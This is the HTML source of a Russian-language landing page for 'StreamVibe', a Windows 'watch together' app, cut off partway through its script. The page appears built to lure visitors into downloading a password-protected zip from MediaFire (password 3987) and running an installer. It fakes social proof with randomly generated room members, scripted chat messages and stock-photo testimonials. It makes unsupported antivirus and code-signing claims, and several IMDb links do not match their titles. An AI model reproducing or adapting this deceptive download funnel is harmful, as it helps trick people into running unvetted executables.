<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StreamVibe</title>
    <link rel="icon" href="favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- Navigation -->
    <header>
        <a href="#" class="logo">
            <i class="fas fa-play-circle"></i>
            StreamVibe
        </a>
        <nav>
            <div class="nav-links">
                <a href="#popular">Фильмы</a>
                <a href="#features">Особенности</a>
                <a href="#faq">FAQ</a>
                <a href="#contacts">Контакты</a>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="hero section" id="hero">
        <div class="hero-content">
            <h1>Смотри фильмы в 4K вместе с друзьями</h1>
            <div class="hero-video">
                <iframe src="https://www.youtube.com/embed/ueCc-AYUMRs?si=OGO5gdSGZf5yl_ih&autoplay=0" frameborder="0" allowfullscreen></iframe>
            </div>
            <div class="cta-container">
                <a href="#" class="cta-btn cta-primary" onclick="downloadApp()">
                    <i class="fas fa-download"></i>
                    Скачать для Windows
                </a>
                <a href="#movie-select" class="cta-btn cta-secondary">
                    <i class="fas fa-users"></i>
                    Присоединиться к комнате
                </a>
            </div>
        </div>
    </section>

    <!-- Popular Movies -->
    <section id="popular" class="popular-movies section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-fire"></i>
            </div>
            <h2 class="section-title">Популярное сейчас</h2>
        </div>
        <div class="movie-grid">
            <a href="https://www.imdb.com/title/tt15239678/" class="movie-card">
                <div class="play-overlay">
                    <i class="fas fa-play"></i>
                </div>
                <img src="img2.jpg" alt="Dune: Part Two">
                <div class="rating">8.7</div>
                <div class="movie-card-content">
                    <h3>Dune: Part Two</h3>
                </div>
            </a>
            <a href="https://www.imdb.com/title/tt15398776/" class="movie-card">
                <div class="play-overlay">
                    <i class="fas fa-play"></i>
                </div>
                <img src="img4.jpg" alt="Oppenheimer">
                <div class="rating">8.4</div>
                <div class="movie-card-content">
                    <h3>Oppenheimer</h3>
                </div>
            </a>
            <a href="https://www.imdb.com/title/tt0816692/" class="movie-card">
                <div class="play-overlay">
                    <i class="fas fa-play"></i>
                </div>
                <img src="img5.jpg" alt="The Batman">
                <div class="rating">7.9</div>
                <div class="movie-card-content">
                    <h3>The Batman</h3>
                </div>
            </a>
            <a href="https://www.imdb.com/title/tt3748528/" class="movie-card">
                <div class="play-overlay">
                    <i class="fas fa-play"></i>
                </div>
                <img src="img3.jpg" alt="Stranger Things S5">
                <div class="rating">8.7</div>
                <div class="movie-card-content">
                    <h3>Stranger Things S5</h3>
                </div>
            </a>
            <a href="https://www.imdb.com/title/tt0439572/" class="movie-card">
                <div class="play-overlay">
                    <i class="fas fa-play"></i>
                </div>
                <img src="img6.jpg" alt="Avatar: Fire and Ash">
                <div class="rating">7.8</div>
                <div class="movie-card-content">
                    <h3>Avatar: Fire and Ash</h3>
                </div>
            </a>
        </div>
    </section>

    <!-- Features -->
    <section id="features" class="features-container section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-star"></i>
            </div>
            <h2 class="section-title">Почему StreamVibe?</h2>
        </div>
        <div class="features">
            <div class="feature-grid">
                <div class="feature">
                    <i class="fas fa-users"></i>
                    <h3>Совместный просмотр</h3>
                    <p>Создавай приватные комнаты и приглашай друзей для синхронного просмотра в реальном времени</p>
                </div>
                <div class="feature">
                    <i class="fas fa-comments"></i>
                    <h3>Чат и голосовой чат</h3>
                    <p>Общайтесь во время просмотра без спойлеров. Голосовой чат для живого общения</p>
                </div>
                <div class="feature">
                    <i class="fab fa-windows"></i>
                    <h3>Оптимизировано для Windows</h3>
                    <p>Стабильная работа, минимальная нагрузка на систему и максимальная производительность</p>
                </div>
                <div class="feature">
                    <i class="fas fa-shield-alt"></i>
                    <h3>Полная приватность</h3>
                    <p>Комнаты доступны только приглашенным пользователям. End-to-End шифрование чатов</p>
                </div>
                <div class="feature">
                    <i class="fas fa-tv"></i>
                    <h3>4K и HDR качество</h3>
                    <p>Поддержка высокого разрешения и HDR контента без потери качества изображения</p>
                </div>
                <div class="feature">
                    <i class="fas fa-globe"></i>
                    <h3>Мультиплатформенность</h3>
                    <p>Интеграция с Netflix, YouTube, Amazon Prime, Disney+ и поддержка локальных файлов</p>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section class="how-it-works section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-cogs"></i>
            </div>
            <h2 class="section-title">Как это работает?</h2>
        </div>
        <div class="steps">
            <div class="step">
                <div class="step-number">01</div>
                <h3>Скачай и установи</h3>
                <p>Загрузи приложение для Windows и установи за 2 минуты</p>
            </div>
            <div class="step">
                <div class="step-number">02</div>
                <h3>Создай комнату</h3>
                <p>Выбери фильм или сериал и сгенерируй уникальную ссылку для друзей</p>
            </div>
            <div class="step">
                <div class="step-number">03</div>
                <h3>Смотрите вместе</h3>
                <p>Видео автоматически синхронизируется для всех участников комнаты</p>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-quote-left"></i>
            </div>
            <h2 class="section-title">Что говорят наши пользователи</h2>
        </div>
        <div class="testimonial-grid">
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/women/71.jpg" alt="Вера Каримова" class="testimonial-avatar">
                <div class="testimonial-text">"StreamVibe полностью изменил наши посиделки! Смотрим фильмы с подругами, чат работает идеально, синхронизация без задержек. Просто огонь!"</div>
                <div class="testimonial-author">- Вера Каримова, 22 года</div>
            </div>
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/men/44.jpg" alt="Павел Гарнов" class="testimonial-avatar">
                <div class="testimonial-text">"Качество 4K просто потрясающее! Синхронизация работает без лагов даже при слабом соединении. Скачал за минуту и сразу начал пользоваться."</div>
                <div class="testimonial-author">- Павел Гарнов, 28 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/women/62.jpg" alt="Роза Макеева" class="testimonial-avatar">
                <div class="testimonial-text">"Идеально для девичников! Приватные комнаты — это то, что нужно. Все подруги в восторге, теперь это наша основная платформа для кино."</div>
                <div class="testimonial-author">- Роза Макеева, 19 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/men/43.jpg" alt="Глеб Ершов" class="testimonial-avatar">
                <div class="testimonial-text">"Смотрели Oppenheimer — ощущения как в настоящем кинотеатре! Качество изображения и звука на высоте, все работает стабильно."</div>
                <div class="testimonial-author">- Глеб Ершов, 25 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/women/3.jpg" alt="Ксения Власова" class="testimonial-avatar">
                <div class="testimonial-text">"Приватные комнаты — настоящая находка! Никто не мешает, можно спокойно обсуждать сюжет. Интерфейс интуитивно понятный."</div>
                <div class="testimonial-author">- Ксения Власова, 21 год</div>
            </div>
            <div class="testimonial">
                <img src="https://randomuser.me/api/portraits/men/51.jpg" alt="Степан Степанов" class="testimonial-avatar">
                <div class="testimonial-text">"Простое и удобное приложение. Скачал, установил, создали комнату — и сразу в дело. Никаких сложностей, всё работает как часы."</div>
                <div class="testimonial-author">- Степан Степанов, 30 лет</div>
            </div>
        </div>
    </section>

    <!-- FAQ -->
    <section id="faq" class="faq section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-question-circle"></i>
            </div>
            <h2 class="section-title">Часто задаваемые вопросы</h2>
        </div>
        <div class="faq-container">
            <div class="faq-item">
                <div class="faq-question">
                    <span>Как скачать и установить приложение?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Простая установка в 4 шага:</strong>
                    <ul>
                        <li>Нажмите кнопку "Скачать для Windows" на главной странице</li>
                        <li>Распакуйте архив (пароль: 3987)</li>
                        <li>Запустите stream-vibe-installer.exe</li>
                        <li>Следуйте инструкциям установщика (2-3 минуты)</li>
                    </ul>
                    <p><strong>Поддержка:</strong> Доступна 24/7 через встроенный чат</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>На каких платформах работает StreamVibe?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Текущая поддержка:</strong>
                    <ul>
                        <li><code>Windows 10/11</code> — Полная поддержка (64-bit)</li>
                        <li><code>Браузерная версия</code> — Chrome, Firefox, Safari</li>
                    </ul>
                    <strong>В разработке:</strong>
                    <ul>
                        <li><code>macOS</code> — Релиз через 2-3 месяца</li>
                        <li><code>iOS/Android</code> — Первая половина 2026 года</li>
                    </ul>
                    <p><strong>Системные требования:</strong> 4 ГБ RAM, 100 МБ места</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Как работает синхронизация видео?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Технология SyncTime™ обеспечивает:</strong>
                    <ul>
                        <li><strong>Задержка &lt; 50 мс</strong> между участниками</li>
                        <li>Автоматическая компенсация буферизации</li>
                        <li>Адаптивная синхронизация под разную скорость интернета</li>
                        <li>Резервное копирование через WebRTC</li>
                    </ul>
                    <p>Система автоматически подстраивается под каждого участника комнаты</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Какие стриминговые сервисы поддерживаются?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Полная поддержка:</strong>
                    <ul>
                        <li><code>YouTube</code> — Все видео включая 4K и 60 FPS</li>
                        <li><code>Netflix</code> — Премиум контент (требуется подписка)</li>
                        <li><code>Amazon Prime Video</code> — 4K HDR контент</li>
                        <li><code>Disney+</code> — Marvel, Star Wars, Pixar</li>
                        <li><code>HBO Max</code> — Контент Warner Bros.</li>
                    </ul>
                    <strong>Дополнительно:</strong>
                    <ul>
                        <li><code>Спорт:</code> TNT Sports, ESPN+, DAZN</li>
                        <li><code>Музыка:</code> Spotify, Apple Music</li>
                        <li><code>Файлы:</code> MP4, MKV до 8K + субтитры</li>
                    </ul>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Насколько безопасно использование?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Меры безопасности:</strong>
                    <ul>
                        <li><strong>Антивирусная защита:</strong> Проверено Norton, McAfee, Kaspersky</li>
                        <li><strong>Шифрование:</strong> TLS 1.3 для соединений + AES-256 для данных</li>
                        <li><strong>Приватность:</strong> End-to-End шифрование приватных комнат</li>
                        <li><strong>Аутентификация:</strong> Цифровая подпись Microsoft Authenticode</li>
                    </ul>
                    <strong>Что НЕ делаем:</strong>
                    <ul>
                        <li>Не собираем пароли от стриминговых сервисов</li>
                        <li>Не храним историю просмотров без согласия</li>
                        <li>Не показываем рекламу в приложении</li>
                        <li>Соответствуем GDPR и российскому законодательству</li>
                    </ul>
                    <p><strong>Важно:</strong> Скачивайте только с официального сайта</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Поддерживается ли оффлайн просмотр?</span>
                    <span class="icon">+</span>
                </div>
                <div class="faq-answer">
                    <strong>Онлайн режим (основной):</strong>
                    <ul>
                        <li><code>1080p:</code> От 5 Мбит/с</li>
                        <li><code>4K:</code> От 25 Мбит/с</li>
                        <li>Авто-подстройка под скорость соединения</li>
                    </ul>
                    <strong>Оффлайн возможности:</strong>
                    <ul>
                        <li><code>Локальные файлы:</code> MP4, MKV до 8K разрешения</li>
                        <li><code>Скачивание:</code> Netflix, YouTube Premium</li>
                        <li><code>Локальная сеть:</code> Wi-Fi без интернета (multicast протокол)</li>
                    </ul>
                    <strong>Хранение:</strong>
                    <ul>
                        <li>Автоматическая папка <code>C:\StreamVibe\Offline</code></li>
                        <li>Поддержка USB/HDD накопителей</li>
                        <li>Встроенный плеер с субтитрами и эквалайзером</li>
                    </ul>
                    <p><strong>Ограничения:</strong> Чат работает только в локальной сети, нет облачного сохранения прогресса</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Movie Rooms -->
    <section id="movie-select" class="section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-door-open"></i>
            </div>
            <h2 class="section-title">Активные комнаты</h2>
        </div>
        <div class="rooms-header">
            <input type="text" id="search" placeholder="Поиск по фильмам..." onkeyup="searchRooms()">
            <button class="create-room-btn" onclick="createRoom()">
                <i class="fas fa-plus"></i>
                Создать комнату
            </button>
        </div>
        <div class="movie-rooms">
            <div class="room-card enter-left" data-page="1">
                <img src="mimg1.jpg" alt="Interstellar">
                <h4>Interstellar</h4>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card enter-left" data-page="1">
                <img src="mimg2.jpg" alt="Inception">
                <h4>Inception</h4>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card enter-left" data-page="1">
                <img src="mimg3.jpg" alt="The Dark Knight">
                <h4>The Dark Knight</h4>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card enter-right waiting" data-page="2">
                <img src="mimg4.jpg" alt="Pulp Fiction">
                <h4>Pulp Fiction</h4>
                <span class="room-status">Ожидает</span>
            </div>
            <div class="room-card enter-right" data-page="2">
                <img src="mimg5.jpg" alt="The Matrix">
                <h4>The Matrix</h4>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card enter-right" data-page="2">
                <img src="mimg6.jpg" alt="Fight Club">
                <h4>Fight Club</h4>
                <span class="room-status">В эфире</span>
            </div>
        </div>
        <div class="pagination">
            <button class="page-btn active" data-page="1">1</button>
            <button class="page-btn" data-page="2">2</button>
        </div>
    </section>

    <!-- Watch Party Modal -->
    <div id="watch-party">
        <div class="watch-party-container">
            <div class="party-header">
                <h2 class="party-title">
                    <i class="fas fa-film"></i>
                    <span id="party-movie-title">Загрузка...</span>
                </h2>
                <div class="party-buttons">
                    <button onclick="shareRoom()">
                        <i class="fas fa-share-alt"></i>
                        Поделиться ссылкой
                    </button>
                    <button onclick="leaveRoom()">
                        <i class="fas fa-sign-out-alt"></i>
                        Выйти из комнаты
                    </button>
                </div>
            </div>
            <div class="party-users">
                <h3>
                    <i class="fas fa-users"></i>
                    Участники комнаты
                </h3>
                <div id="users-list">
                    <div class="user you">
                        <div class="user-avatar">В</div>
                        <span>Вы</span>
                        <div class="status"></div>
                    </div>
                </div>
            </div>
            <div class="player-chat">
                <div id="video-player">
                    <iframe id="video-player-iframe" src="" frameborder="0" allowfullscreen></iframe>
                    <div id="video-overlay"></div>
                </div>
                <div id="chat">
                    <h3>
                        <i class="fas fa-comments"></i>
                        Чат комнаты
                    </h3>
                    <ul id="messages">
                        <li class="system">
                            <strong>StreamVibe:</strong> Добро пожаловать в комнату! Наслаждайтесь просмотром вместе с друзьями
                            <small></small>
                        </li>
                        <li class="download-message">
                            Скачайте наше приложение, чтобы полноценно пользоваться чатом!
                        </li>
                    </ul>
                    <div class="chat-input">
                        <input type="text" placeholder="Напиши сообщение..." onkeypress="handleKeyPress(event)">
                        <button onclick="sendMessage()">
                            <i class="fas fa-paper-plane"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Download Modal -->
    <div id="download-modal" class="modal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal('download-modal')">&times;</button>
            <h2>Скачивание началось!</h2>
            <p>Ваш файл загружается. Пожалуйста, дождитесь завершения.</p>
            <div class="progress-bar">
                <div class="progress" id="download-progress"></div>
            </div>
            <div class="modal-hint">
                <i class="fas fa-info-circle"></i>
                После скачивания запустите <code>stream-vibe-installer.exe</code> и следуйте инструкциям.
            </div>
        </div>
    </div>

    <!-- Create Room Modal -->
    <div id="create-room-modal" class="modal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal('create-room-modal')">&times;</button>
            <h2>Создание комнаты</h2>
            <p>Скачайте наше приложение, чтобы создать комнату!</p>
            <button class="modal-button" onclick="downloadApp(); document.getElementById('create-room-modal').classList.remove('visible')">
                Скачать приложение
            </button>
        </div>
    </div>

    <!-- Footer -->
    <footer id="contacts" class="section">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-envelope"></i>
            </div>
            <h2>Связаться с нами</h2>
        </div>
        <div class="contacts">
            <a href="#" class="contact-link" title="Telegram">
                <i class="fab fa-telegram"></i>
            </a>
            <a href="#" class="contact-link" title="Discord">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#" class="contact-link" title="Twitter">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="contact-link" title="Email">
                <i class="fas fa-envelope"></i>
            </a>
        </div>
        <div class="contact-form">
            <h3>Обратная связь</h3>
            <div class="error" id="form-error"></div>
            <form id="contact-form">
                <input type="text" placeholder="Ваше имя" required>
                <input type="email" placeholder="Email" required>
                <div class="textarea-container">
                    <textarea placeholder="Сообщение" maxlength="500" required></textarea>
                    <div class="char-counter">0/500</div>
                </div>
                <button type="submit">Отправить</button>
            </form>
        </div>
        <div class="footer-links">
            <a href="#">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</a>
            <a href="#">УСЛОВИЯ ИСПОЛЬЗОВАНИЯ</a>
            <a href="#">ПОДДЕРЖКА</a>
            <a href="#">О НАС</a>
        </div>
    </footer>

    <script>
        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const targetId = this.getAttribute('href');
                let target;
                if (targetId === '#') {
                    target = document.querySelector('.hero');
                } else {
                    target = document.querySelector(targetId);
                }
                if (target) {
                    const headerHeight = document.querySelector('header').offsetHeight;
                    const targetPosition = target.getBoundingClientRect().top + window.pageYOffset - headerHeight;
                    window.scrollTo({
                        top: targetPosition,
                        behavior: 'smooth'
                    });
                }
            });
        });

        // Download app function
        function downloadApp() {
            const modal = document.getElementById('download-modal');
            modal.classList.add('visible');
            
            // Simulate download progress
            const progress = document.getElementById('download-progress');
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += Math.random() * 15;
                    if (width > 100) width = 100;
                    progress.style.width = width + '%';
                }
            }, 200);

            setTimeout(() => {
                modal.classList.remove('visible');
                // Open MediaFire link in a new window
                window.open('https://www.mediafire.com/file/61rguo8o35jksx5/stream-vibe.zip/file', '_blank');
            }, 3000);
        }

        // Close modal function
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('visible');
        }

        // Create room modal
        function createRoom() {
            const modal = document.getElementById('create-room-modal');
            modal.classList.add('visible');
        }

        // FAQ accordion
        document.querySelectorAll('.faq-question').forEach(question => {
            question.addEventListener('click', () => {
                const faqItem = question.parentElement;
                const isActive = faqItem.classList.contains('active');
                
                // Close all FAQ items
                document.querySelectorAll('.faq-item').forEach(item => {
                    item.classList.remove('active');
                });
                
                // Open clicked item if it wasn't active
                if (!isActive) {
                    faqItem.classList.add('active');
                }
            });
        });

        // Feature animation on scroll
        function animateFeatures() {
            const features = document.querySelectorAll('.feature');
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('visible');
                    }
                });
            }, { threshold: 0.1 });
            
            features.forEach(feature => observer.observe(feature));
        }

        // Step animation on scroll
        function animateSteps() {
            const steps = document.querySelectorAll('.step');
            const observer = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.classList.add('visible');
                        }, index * 200);
                    }
                });
            }, { threshold: 0.2 });
            
            steps.forEach(step => observer.observe(step));
        }

        // Testimonial animation on scroll
        function animateTestimonials() {
            const testimonials = document.querySelectorAll('.testimonial');
            const observer = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.style.opacity = '1';
                            entry.target.style.transform = 'translateY(0)';
                        }, index * 150);
                    }
                });
            }, { threshold: 0.1 });
            
            testimonials.forEach(testimonial => {
                testimonial.style.opacity = '0';
                testimonial.style.transform = 'translateY(30px)';
                testimonial.style.transition = 'all 0.6s ease';
                observer.observe(testimonial);
            });
        }

        // Room search functionality
        function searchRooms() {
            const searchTerm = document.getElementById('search').value.toLowerCase();
            const roomCards = document.querySelectorAll('.room-card');
            
            roomCards.forEach(card => {
                const title = card.querySelector('h4').textContent.toLowerCase();
                const isVisible = title.includes(searchTerm);
                card.style.display = isVisible ? 'flex' : 'none';
                if (isVisible) {
                    card.style.opacity = '1';
                    card.style.visibility = 'visible';
                }
            });
        }

        // Pagination functionality
        function initPagination() {
            const pageButtons = document.querySelectorAll('.page-btn');
            const roomCards = document.querySelectorAll('.room-card');
            let currentPage = '1';

            function showPage(pageNumber) {
                const isBackward = parseInt(pageNumber) < parseInt(currentPage);
                const direction = isBackward ? 'enter-right' : 'enter-left';

                // Reset styles and classes for all cards
                roomCards.forEach(card => {
                    card.classList.remove('enter-left', 'enter-right');
                    card.style.opacity = '0';
                    card.style.visibility = 'hidden';
                    card.style.display = 'none';
                    card.style.animation = 'none';
                });

                // Show cards for the selected page
                const cardsToShow = Array.from(document.querySelectorAll(`.room-card[data-page="${pageNumber}"]`));
                const orderedCards = isBackward ? cardsToShow.reverse() : cardsToShow;
                orderedCards.forEach((card, index) => {
                    card.style.display = 'flex';
                    card.style.opacity = '0';
                    card.style.visibility = 'visible';
                    setTimeout(() => {
                        card.classList.add(direction);
                        card.style.opacity = '1';
                    }, index * 250);
                });

                // Update active button
                pageButtons.forEach(btn => {
                    btn.classList.remove('active');
                    if (btn.getAttribute('data-page') === pageNumber) {
                        btn.classList.add('active');
                    }
                });

                currentPage = pageNumber;
            }

            pageButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const page = button.getAttribute('data-page');
                    showPage(page);
                });
            });

            showPage('1');
        }

        // Watch party functions
        const movieTrailers = {
            'Interstellar': 'https://vkvideo.ru/video_ext.php?oid=-220018529&id=456243270&hd=2&autoplay=1&mute=1',
            'Inception': 'https://vkvideo.ru/video_ext.php?oid=-220018529&id=456240825&hd=2&autoplay=1&mute=1',
            'The Dark Knight': 'https://vkvideo.ru/video_ext.php?oid=-143260624&id=456239857&hd=2&autoplay=1&mute=1',
            'Pulp Fiction': 'https://vkvideo.ru/video_ext.php?oid=-220018529&id=456239747&hd=2&autoplay=1&mute=1',
            'The Matrix': 'https://vkvideo.ru/video_ext.php?oid=-220018529&id=456240812&hd=2&autoplay=1&mute=1',
            'Fight Club': 'https://vkvideo.ru/video_ext.php?oid=-220018529&id=456243245&hd=2&autoplay=1&mute=1'
        };

        const roomUsers = {
            'Interstellar': [],
            'Inception': [],
            'The Dark Knight': [],
            'Pulp Fiction': [],
            'The Matrix': [],
            'Fight Club': []
        };

        const names = [
            'Алексей', 'Мария', 'Иван', 'Ольга', 'Дмитрий', 'Елена', 'Сергей', 'Анастасия',
            'Владимир', 'Юлия', 'Михаил', 'Татьяна', 'Андрей', 'Екатерина', 'Павел', 'Наталья',
            'Артем', 'Светлана', 'Николай', 'Ирина', 'Виктор', 'Алина', 'Роман', 'Ксения',
            'Егор', 'Дарья', 'Максим', 'Анна', 'Константин', 'Валерия'
        ];

        function generateRoomUsers() {
            Object.keys(roomUsers).forEach(room => {
                if (roomUsers[room].length === 0) {
                    const userCount = Math.floor(Math.random() * 6) + 2; // 2-7 users
                    const availableNames = [...names];
                    for (let i = 0; i < userCount; i++) {
                        if (availableNames.length === 0) break;
                        const randomIndex = Math.floor(Math.random() * availableNames.length);
                        const selectedName = availableNames.splice(randomIndex, 1)[0];
                        roomUsers[room].push(selectedName);
                    }
                }
            });
        }

        // Join room
        let scrollPosition = 0;
        function joinRoom(movieTitle) {
            const watchParty = document.getElementById('watch-party');
            const movieTitleElement = document.getElementById('party-movie-title');
            const videoPlayer = document.getElementById('video-player-iframe');
            const videoOverlay = document.getElementById('video-overlay');
            const usersList = document.getElementById('users-list');
            const messages = document.getElementById('messages');

            // Save scroll position and disable scrolling
            scrollPosition = window.pageYOffset;
            document.body.style.overflow = 'hidden';

            // Set movie title
            movieTitleElement.textContent = movieTitle;

            // Set video source without start time
            videoPlayer.src = movieTrailers[movieTitle];

            // Show overlay to prevent interaction
            videoOverlay.style.display = 'block';

            // Block keyboard controls
            const blockPlayerControls = (e) => {
                // Block space (pause), arrows (seek), and common player shortcuts (J, K, L, F)
                if ([' ', 'ArrowLeft', 'ArrowRight', 'KeyJ', 'KeyK', 'KeyL', 'KeyF'].includes(e.code)) {
                    e.preventDefault();
                }
            };
            document.addEventListener('keydown', blockPlayerControls);

            // Block context menu and wheel events on video player
            videoOverlay.addEventListener('contextmenu', (e) => e.preventDefault());
            videoOverlay.addEventListener('wheel', (e) => e.preventDefault());

            // Clear previous users
            usersList.innerHTML = `
                <div class="user you">
                    <div class="user-avatar">В</div>
                    <span>Вы</span>
                    <div class="status"></div>
                </div>
            `;

            // Add users for this room
            roomUsers[movieTitle].forEach(name => {
                const userElement = document.createElement('div');
                userElement.className = 'user';
                userElement.innerHTML = `
                    <div class="user-avatar">${name[0]}</div>
                    <span>${name}</span>
                    <div class="status"></div>
                `;
                usersList.appendChild(userElement);
            });

            // Reset messages with welcome message
            messages.innerHTML = `
                <li class="system">
                    <strong>StreamVibe:</strong> Добро пожаловать в комнату! Наслаждайтесь просмотром!
                    <small>${new Date().toLocaleTimeString()}</small>
                </li>
                <li class="download-message">
                    Скачайте наше приложение, чтобы полноценно пользоваться чатом!
                </li>
            `;

            // Show watch party modal
            watchParty.classList.add('active');

            // Auto-scroll chat to bottom
            messages.scrollTop = messages.scrollHeight;

            // Simulate chat messages
            simulateChatMessages(movieTitle);

            // Clean up event listeners when leaving room
            watchParty.dataset.cleanup = JSON.stringify({ blockPlayerControls });
        }

        // Simulate chat messages
        function simulateChatMessages(movieTitle) {
            const messages = [
                'Кто-нибудь заметил, как круто снята эта сцена? Камера просто захватывает дух!',
                'Мне кажется, этот поворот сюжета был совершенно неожиданным, как вам?',
                'Звук в этом фильме просто невероятный, особенно в этой части.',
                'Давайте обсудим, что будет дальше, у кого какие теории?',
                'Эта сцена напомнила мне другой фильм, не могу вспомнить какой.',
                'Персонажи в этом фильме такие живые, прямо как настоящие!',
                'Кто-нибудь знает, сколько времени осталось до конца? Очень интересно!',
                'Музыкальное сопровождение здесь просто на высоте, согласны?',
                'Я заметил интересную деталь в кадре, обратите внимание на фон!',
                'Как вам игра главного актера? По-моему, он выкладывается на полную.'
            ];

            function addMessage() {
                const users = roomUsers[movieTitle];
                if (users.length === 0) return;

                const randomUser = users[Math.floor(Math.random() * users.length)];
                const randomMessage = messages[Math.floor(Math.random() * messages.length)];
                const messageElement = document.createElement('li');
                messageElement.className = 'download-prompt';
                messageElement.innerHTML = `
                    <strong>${randomUser}:</strong> ${randomMessage}
                    <small>${new Date().toLocaleTimeString()}</small>
                `;
                document.getElementById('messages').appendChild(messageElement);
                messageElement.scrollIntoView({ behavior: 'smooth' });
            }

            // Random interval between 5-15 seconds
            const interval = setInterval(() => {
                if (!document.getElementById('watch-party').classList.contains('active')) {
                    clearInterval(interval);
                    return;
                }
                addMessage();
            }, Math.random() * 10000 + 5000);
        }

        // Send message
        function sendMessage() {
            const input = document.querySelector('.chat-input input');
            const message = input.value.trim();
            if (!message) return;

            const messageElement = document.createElement('li');
            messageElement.className = 'you';
            messageElement.innerHTML = `
                <strong>Вы:</strong> ${message}
                <small>${new Date().toLocaleTimeString()}</small>
            `;
            document.getElementById('messages').appendChild(messageElement);
            messageElement.scrollIntoView({ behavior: 'smooth' });
            input.value = '';
        }

        // Handle Enter key for sending messages
        function handleKeyPress(event) {
            if (event.key === 'Enter') {
                sendMessage();
            }
        }

        // Share room
        function shareRoom() {
            const movieTitle = document.getElementById('party-movie-title').textContent;
            const shareLink = `https://streamvibe.com/room/${encodeURIComponent(movieTitle)}`;
            navigator.clipboard.writeText(shareLink).then(() => {
                alert('Ссылка на комнату скопирована в буфер обмена!');
            });
        }

        // Leave room
        function leaveRoom() {
            const watchParty = document.getElementById('watch-party');
            const videoPlayer = document.getElementById('video-player-iframe');
            const videoOverlay = document.getElementById('video-overlay');
            const messages = document.getElementById('messages');

            // Remove event listeners
            const cleanup = JSON.parse(watchParty.dataset.cleanup || '{}');
            if (cleanup.blockPlayerControls) {
                document.removeEventListener('keydown', cleanup.blockPlayerControls);
            }
            videoOverlay.removeEventListener('contextmenu', (e) => e.preventDefault());
            videoOverlay.removeEventListener('wheel', (e) => e.preventDefault());

            // Reset modal
            watchParty.classList.remove('active');
            videoPlayer.src = '';
            videoOverlay.style.display = 'none';
            messages.innerHTML = `
                <li class="system">
                    <strong>StreamVibe:</strong> Добро пожаловать в комнату! Наслаждайтесь просмотром вместе с друзьями
                    <small>${new Date().toLocaleTimeString()}</small>
                </li>
                <li class="download-message">
                    Скачайте наше приложение, чтобы полноценно пользоваться чатом!
                </li>
            `;
            // Restore scrolling and scroll to movie-select section
            document.body.style.overflow = '';
            const movieSelect = document.getElementById('movie-select');
            const headerHeight = document.querySelector('header').offsetHeight;
            const targetPosition = movieSelect.getBoundingClientRect().top + window.pageYOffset - headerHeight;
            window.scrollTo({
                top: targetPosition,
                behavior: 'smooth'
            });
        }

        // Room card click handler
        document.querySelectorAll('.room-card').forEach(card => {
            card.addEventListener('click', () => {
                const movieTitle = card.querySelector('h4').textContent;
                joinRoom(movieTitle);
            });
        });

        // Contact form submission
        document.getElementById('contact-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const formError = document.getElementById('form-error');
            formError.style.display = 'none';
            
            const name = e.target[0].value;
            const email = e.target[1].value;
            const message = e.target[2].value;

            if (!name || !email || !message) {
                formError.textContent = 'Пожалуйста, заполните все поля!';
                formError.style.display = 'block';
                return;
            }

